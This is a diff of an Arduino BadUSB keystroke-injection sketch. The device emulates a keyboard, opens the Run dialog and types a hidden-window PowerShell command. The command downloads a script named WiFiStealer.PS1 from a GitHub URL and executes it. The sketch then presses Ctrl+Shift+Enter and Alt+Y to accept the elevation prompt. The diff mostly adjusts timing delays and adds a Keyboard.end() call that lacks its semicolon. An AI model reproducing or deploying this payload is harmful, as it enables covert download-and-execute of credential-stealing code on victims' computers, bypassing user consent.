@@ -3,20 +3,20 @@
 void setup() {
   // Initialize the USB keyboard emulation
   Keyboard.begin();
-  delay(200);  // Delay to allow time for the keyboard to initialize
+  delay(1500);  // Delay to allow time for the keyboard to initialize
 
   // Simulate pressing the Windows key and 'r' key simultaneously
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
-  delay(100);
+  delay(200);
   Keyboard.releaseAll();
 
-  delay(200);  // Delay 0.2 seconds
+  delay(2000);  // Delay 2 seconds
 
   // Type the PowerShell command, specify remote powershell script location 
-  Keyboard.println("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");
+  Keyboard.print("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");
 
-  delay(500);  // Delay 0.5 seconds
+  delay(1000);  // Delay 1 second
 
   // Simulate Ctrl + Shift + Enter
   Keyboard.press(KEY_LEFT_CTRL);
@@ -25,13 +25,16 @@ void setup() {
   delay(100);
   Keyboard.releaseAll();
 
-  delay(500);  // Delay 0.5 seconds
+  delay(2000);  // Delay 2 seconds
 
   // Simulate Alt + Y
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   delay(100);
   Keyboard.releaseAll();
+  
+  delay(300);
+  Keyboard.end()
 }
 
 void loop() {
